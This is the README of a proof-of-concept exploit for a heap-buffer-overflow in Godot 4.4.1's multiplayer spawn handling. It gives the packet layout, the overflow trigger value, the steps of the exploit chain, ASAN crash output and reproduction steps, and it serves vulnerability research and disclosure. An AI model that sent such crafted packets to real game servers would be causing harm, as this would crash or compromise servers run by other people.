# Godot OOB Spawn Exploit

**A proof-of-concept demonstrating a heap-buffer-overflow vulnerability in Godot Engine 4.4.1-stable's multiplayer spawn system.**

The bug lives in `SceneReplicationInterface::on_spawn_receive()` (`scene_replication_interface.cpp`). A uint32 overflow in the bounds check allows a connected client to trigger an out-of-bounds heap read by sending a crafted ENet packet — no engine modification needed.

---

## The Vulnerability

### Root Cause

In `scene_replication_interface.cpp`, the `on_spawn_receive()` function parses a SPAWN command packet with this structure:

```
[0]    cmd (1 byte)
[1]    scene_id (1 byte)
[2-5]  node_target / cache_id (uint32 LE)
[6-9]  net_id (uint32 LE)
[10-13] sync_len (uint32 LE)     ← the trigger
[14-17] name_len (uint32 LE)
[18+]  sync_ids + name (variable)
```

The bounds check computes:

```cpp
uint32_t sync_len;  // from packet[10-13]
uint32_t name_len;  // from packet[14-17]
uint32_t remaining = packet_size - 18;
uint32_t sum = sync_len * 4 + name_len;

if (sum > remaining) { /* reject */ }
```

When `sync_len = 0x40000001`, the multiplication `sync_len * 4` wraps in uint32:

```
0x40000001 * 4 = 0x100000004 → wraps to 0x00000004 (4)
4 + 20 (name_len) = 24
remaining = 42 - 18 = 24
24 > 24 → false → PASSES ✓
```

### The Math

| Field | Value |
|---|---|
| `sync_len` | `0x40000001` (1,073,741,825) |
| `sync_len * 4` (uint32) | wraps to **4** |
| `name_len` | 20 |
| Bounds check | `24 > 24` = **false → PASSES** |
| Loop iterations | **1,073,741,825** (reading 4 bytes each) |
| OOB starts at | iteration 7 (reads past the 42-byte buffer) |

The loop then reads `sync_len * 4` bytes from the packet, iterating ~1 billion times and reading far past the allocated 42-byte buffer.

---

## Exploit Chain

The exploit requires **no C++ engine modification** — Godot exposes `ENetPacketPeer.send()` to GDScript, so raw ENet packets can be injected directly.

```
Client connects ──→ Server delegates ExploitSpawner authority
         │
         ▼
SIMPLIFY_PATH sent ──→ Registers cache entry for Game/ExploitSpawner
  (cmd=1, cache_id=0xDEADBEEF)   (server accepts even with fake MD5)
         │
         ▼
Malformed SPAWN sent ──→ uint32 overflow bypasses bounds check
  (cmd=4, sync_len=0x40000001)   → loop reads OOB on the heap
         │
         ▼
ASAN detects ──→ heap-buffer-overflow at decode_uint32
  "0 bytes to the right of 42-byte region"
```

### Key Files

| File | Purpose |
|---|---|
| `godot-3d-multiplayer-template/scripts/exploit/oob_spawn_exploit.gd` | The exploit GDScript — crafts and sends SIMPLIFY_PATH + malformed SPAWN |
| `godot-3d-multiplayer-template/scenes/game.tscn` | Modified scene with `ExploitSpawner` (MultiplayerSpawner) and `OOBExploit` nodes |
| `godot-3d-multiplayer-template/scripts/network/multiplayer_manager.gd` | Authority delegation: server sets ExploitSpawner authority to connecting client |

---

## ASAN Evidence

When the server runs on a Godot 4.4.1 build with AddressSanitizer enabled:

```
==37832==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x11effc57d4ba
READ of size 1 at 0x11effc57d4ba thread T0

0x11effc57d4ba is located 0 bytes to the right of 42-byte region [0x11effc57d490,0x11effc57d4ba)
allocated by thread T0 here:
    #0 in malloc

SUMMARY: AddressSanitizer: heap-buffer-overflow
Shadow bytes around the buggy address:
=>0x0425fbaafa90: fa fa 00 00 00 00 00[02]fa fa fd fd fd fd fd fd
==37832==ABORTING
```

Full logs in `.omo/evidence/`:
- `server-v3-err.txt` — full ASAN report
- `task-9-godot-oob-spawn-exploit.md` — overflow math analysis
- `task-8-server.log` — server lifecycle (resource import errors pre-crash)

---

## How to Reproduce

### Prerequisites

1. **Godot 4.4.1-stable** built with MSVC + ASAN:
   ```powershell
   scons platform=windows target=editor dev_build=yes use_asan=yes
   ```
2. The `godot-3d-multiplayer-template` project (included)

### Steps

1. **Open the project** in the Godot editor once to import assets
2. **Run as server**: `godot.windows.editor.dev.x86_64.san.exe --path godot-3d-multiplayer-template --headless`
3. **Run as client**: `godot.windows.editor.dev.x86_64.san.exe --path godot-3d-multiplayer-template`
4. Client connects → exploit fires automatically → server ASAN catches the OOB

> The `-template` project has an `auto_connect.gd` autoload for quick testing.

---

## What Was NOT Modified

- **No engine C++ source was modified** — the exploit is purely GDScript
- **No Godot binary was patched**
- **No Netfox addon code was touched**
- This is an **offensive PoC only** — no fix is attempted

---

## Disclaimer

This repository is for **educational and security research purposes only**. The vulnerability has been demonstrated against Godot 4.4.1-stable. Use responsibly.
